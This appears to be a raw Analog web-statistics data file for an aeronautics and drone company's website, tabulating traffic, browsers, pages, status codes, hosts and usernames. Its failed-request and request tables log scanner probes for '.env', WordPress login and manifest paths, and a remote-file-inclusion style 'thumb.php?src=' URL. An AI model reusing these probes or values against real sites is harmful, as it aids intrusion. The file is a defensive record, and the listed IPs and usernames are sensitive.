x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	11	06	01	59
x	FR	2007	12	18	17	05
x	LR	2023	11	05	04	46
x	E7	2023	11	06	01	59
x	SR	1491607
x	S7	9669
x	NC	543354
x	C7	0
x	FL	548342
x	F7	577
x	RR	218
x	R7	0
x	NH	106142
x	H7	424
x	BT	57520368399
x	B7	0
1	Rr	398609	26.723	2023
1	Rr	82334	5.520	2022
1	Rr	98917	6.632	2021
1	Rr	89380	5.992	2020
1	Rr	80088	5.369	2019
1	Rr	68927	4.621	2018
1	Rr	60168	4.034	2017
1	Rr	73316	4.915	2016
1	Rr	80796	5.417	2015
1	Rr	110773	7.426	2014
1	Rr	65173	4.369	2013
1	Rr	60742	4.072	2012
1	Rr	57015	3.822	2011
1	Rr	22139	1.484	2010
1	Rr	69710	4.673	2009
1	Rr	71820	4.815	2008
1	Rr	1700	0.114	2007
1	*BT	R	398609	2023
b	lRQq	2	2	440682628	47.429	com.google.android.apps.searchlite/484573
b	lRQq	1	122	3689872846	397.129	MSIE or
b	lRQq	1	309	3637320008	391.473	Dalvik
b	lRQq	2	282	3966143652	426.863	Dalvik/2
b	lRQq	2	27	3966143652	426.863	Dalvik/1
b	lRQq	1	2249	3361049202	361.739	libwww-perl
b	lRQq	2	1794	4130555474	444.558	libwww-perl/6
b	lRQq	2	455	3525461024	379.434	libwww-perl/5
b	lRQq	1	232	3249190218	349.700	DomainCrawler
b	lRQq	2	134	2367824962	254.841	DomainCrawler/3
b	lRQq	2	83	440682628	47.429	DomainCrawler/2
b	lRQq	2	15	440682628	47.429	DomainCrawler/1
b	lRQq	1	16	3249190218	349.700	Windows-Media-Player
b	lRQq	2	11	2808507590	302.270	Windows-Media-Player/11
b	lRQq	2	4	2367824962	254.841	Windows-Media-Player/10
b	lRQq	2	1	2367824962	254.841	Windows-Media-Player/9
b	lRQq	1	27	3249190218	349.700	W3C_Validator
b	lRQq	2	27	3249190218	349.700	W3C_Validator/1
b	lRQq	1	204	3249190218	349.700	Dispatch
b	lRQq	2	204	3249190218	349.700	Dispatch/0
b	lRQq	1	1475732	1685136945	181.366	[not listed: 921]
p	*f	0Q	s
p	lR	1	721872	Windows
p	lR	2	309544	Unknown Windows
p	lR	2	149852	Windows NT
p	lR	2	2233	Windows 95
p	lR	2	246185	Windows XP
p	lR	2	408	Windows CE
p	lR	2	2367	Windows 98
p	lR	2	9469	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	198902	Known robots
p	lR	1	303594	OS unknown
p	lR	1	143782	Macintosh
p	lR	2	139337	Unknown Macintosh
p	lR	2	1203	Macintosh 68k
p	lR	2	3242	Macintosh PowerPC
p	lR	1	111448	Unix
p	lR	2	108868	Linux
p	lR	2	2495	Other Unix
p	lR	2	22	SunOS
p	lR	2	60	BSD
p	lR	2	3	HP-UX
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	47	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	778954	0.000	[root directory]
i	lRc	1	493587	0.000	/images/
i	lRc	1	140283	0.000	/js/
i	lRc	1	72388	0.000	/css/
i	lRc	1	4677	0.000	/uploads/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	236	0.000	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	19657	99	0.000	/links.html
r	lRSc	1	34156	46	0.000	/aboutus.html
r	lRSc	1	30173	41	0.000	/compnews.html
r	lRSc	1	22081	32	0.000	/consultinga.html
r	lRSc	1	18360	32	0.000	/pna.html
r	lRSc	1	9379	31	0.000	/gt380+rpas.html
r	lRSc	1	21032	31	0.000	/cfmt.html
r	lRSc	1	4713	31	0.000	/gt100hl+rpas.html
r	lRSc	1	9335	29	0.000	/gt1500+rpas.html
r	lRSc	1	26191	28	0.000	/uasfc.html
r	lRSc	1	23890	28	0.000	/contactus.html
r	lRSc	1	13172	28	0.000	/sru.html
r	lRSc	1	21480	27	0.000	/cct&m.html
r	lRSc	1	16364	26	0.000	/faq.html
r	lRSc	1	18123	25	0.000	/indevents.html
r	lRSc	1	8834	25	0.000	/gt50t+rpas.html
r	lRSc	1	18567	18	0.000	/employment.html
r	lRSc	1	11820	14	0.000	/rd.html
r	lRSc	1	29123	11	0.000	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	4176	3	0.000	/gtatexan.html
r	lRSc	1	559	2	0.000	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	428	2	0.000	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4359	2	0.000	/uavengines.html
r	lRSc	1	447	1	0.000	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	4111	1	0.000	/banditomav.html
r	lRSc	1	555	1	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	3887	1	0.000	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	981	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	456	0	0.000	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	423904	43.756	.jpg  [JPEG graphics]
t	lRb	1	389270	26.229	.html [Hypertext Markup Language]
t	lRb	1	345975	18.517	[directories]
t	lRb	1	2232	5.242	.mp4
t	lRb	1	778	2.157	.wmv
t	lRb	1	87	2.118	.mpg  [MPEG movie]
t	lRb	1	18734	0.911	.asp  [Active Server REQUESTS]
t	lRb	1	69788	0.296	.gif  [GIF graphics]
t	lRb	1	140329	0.254	.js  [JavaScript code]
t	lRb	1	72404	0.225	.css  [Cascading Style Sheets]
t	lRb	1	2445	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	25661	0.084	[not listed: 6]
z	*FR	2023	04	05	20	41
z	*LR	2023	05	09	10	03
z	ScR	0	0.000	84837	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	0	0.000	85122	101b-  1kb
z	ScR	0	0.000	509907	1kb- 10kb
z	ScR	0	0.000	352085	10kb-100kb
z	ScR	0	0.000	104639	100kb-  1Mb
z	ScR	0	0.000	4584	1Mb- 10Mb
z	ScR	0	0.000	55	10Mb-100Mb
z	ScR	0	0.000	13	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2023	11	05	04	46
c	*f	0R	a
c	R	1394287	200 OK
c	R	8160	206 Partial content
c	R	141	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	89160	304 Not modified since last retrieval
c	R	970	400 Bad request
c	R	207	401 Authentication required
c	R	314	403 Access forbidden
c	R	543225	404 Document not found
c	R	1925	405 Method not allowed
c	R	808	406 Document not acceptable to client
c	R	141	416 Requested range not valid
c	R	624	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2023	11	05	04	34
I	*f	-30S	s
I	lRS	1	133453	194	/robots.txt
I	lRS	1	6420	14	/ads.txt
I	lRS	1	2115	11	/
I	lRS	1	1184	7	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	377	7	/admin/
I	lRS	1	143	7	/simple.php
I	lRS	1	3954	6	/xmlrpc.php
I	lRS	1	2590	4	/.env
I	lRS	1	1080	3	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	1042	3	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	937	3	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	1201	3	/wp-includes/wlwmanifest.xml
I	lRS	1	1084	3	/web/wp-includes/wlwmanifest.xml
I	lRS	1	917	3	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	1224	3	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	8024	3	/wp-login.php
I	lRS	1	919	3	/website/wp-includes/wlwmanifest.xml
I	lRS	1	919	3	/news/wp-includes/wlwmanifest.xml
I	lRS	1	41	3	/wp-head.php
I	lRS	1	861	3	/admin.php
I	lRS	1	1223	3	/wordpress/wp-includes/wlwmanifest.xml
I	lRS	1	1224	3	/wp/wp-includes/wlwmanifest.xml
I	lRS	1	1221	3	/cms/wp-includes/wlwmanifest.xml
I	lRS	1	920	3	/wp2/wp-includes/wlwmanifest.xml
I	lRS	1	1081	3	/test/wp-includes/wlwmanifest.xml
I	lRS	1	1224	3	/site/wp-includes/wlwmanifest.xml
I	lRS	1	39	2	/class.api.php
I	lRS	1	38	2	/wp-content/plugins/press/wp-class.php
I	lRS	1	233	2	/sitemaps.xml
I	lRS	1	617	2	/2018/wp-includes/wlwmanifest.xml
I	lRS	1	371964	265	[not listed: 26366]
L	*FR	2007	12	11	00	52
L	*LR	2023	11	05	04	34
L	*f	-20S	s
L	RS	648	162	199.244.49.19
L	RS	36	36	156.146.59.167
L	RS	323	17	92.205.107.64
L	RS	27	9	209.160.119.186
L	RS	132	9	66.249.66.196
L	RS	3092	9	216.244.66.229
L	RS	40	8	104.248.229.153
L	RS	35	7	41.216.188.162
L	RS	24	6	91.92.251.86
L	RS	75	6	52.167.144.57
L	RS	585	5	194.169.175.26
L	RS	15	5	103.252.136.16
L	RS	25	5	45.66.230.189
L	RS	25	5	139.162.31.101
L	RS	5	5	101.43.178.220
L	RS	129	5	66.249.66.72
L	RS	20	5	13.80.8.175
L	RS	20	5	13.80.13.147
L	RS	20	5	52.25.208.208
L	RS	274	4	194.38.22.71
L	RS	542792	259	[not listed: 83291]
K	*FR	2013	12	22	04	20
K	*LR	2023	11	04	10	44
K	*f	-30S	s
K	lRS	1	27	6	http://gtaeronautics.com/admin/
K	lRS	1	246	3	http://www.gtaeronautics.com/uavengines.html
K	lRS	1	3	1	http://gtaeronautics.com/new_license.php
K	lRS	1	120	1	http://gtaeronautics.com/index.php
K	lRS	1	1	1	http://gtaeronautics.com/index.asp
K	lRS	1	3	1	http://gtaeronautics.com/newsleter.php
K	lRS	1	3	1	http://gtaeronautics.com/by.php
K	lRS	1	64485	0	[not listed: 5840]
E	*FR	2008	01	06	10	12
E	*LR	2023	10	25	06	40
E	*f	-30S	s
E	lSR	1	0	218	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2023	10	25	06	40
l	*f	-20S	s
l	SR	0	218	[not listed: 112]
v	*f	-20B	b
v	Rb	834192	65.103	64.41.87.40
v	Rb	657415	34.897	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2023	10	25	06	40
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	40	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2023	11	05	04	34
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	245736	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2023	09	25	17	34
P	*LR	2023	11	05	04	46
P	R	206	0
P	R	54	<= 0.01
P	R	1590	0.01-0.02
P	R	91433	0.02-0.05
P	R	139655	0.05-0.1 
P	R	186479	0.1 -0.2 
P	R	191291	0.2 -0.5 
P	R	94946	0.5 -1   
P	R	53026	1-  2 
P	R	23346	2-  5 
P	R	10955	5- 10 
P	R	5056	10- 20 
P	R	20508	20- 60 
P	R	3038	60-120 
P	R	12559	120-300 
